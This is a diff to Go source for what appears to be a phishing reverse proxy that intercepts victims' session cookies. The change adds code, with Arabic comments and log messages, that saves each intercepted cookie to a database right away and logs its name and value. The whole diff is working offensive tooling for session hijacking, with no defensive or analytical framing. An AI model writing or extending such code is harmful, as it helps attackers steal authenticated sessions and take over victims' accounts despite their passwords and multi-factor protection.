@@ -989,6 +989,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
 								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+								
+								// تخزين الكوكيز في قاعدة البيانات مباشرة بعد اعتراضها
+								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+									log.Error("database: %v", err)
+								} else {
+									log.Success("[%d] كوكيز تم اعتراضها وتخزينها: %s = %s", ps.Index, ck.Name, ck.Value)
+								}
 							}
 						}
 					}
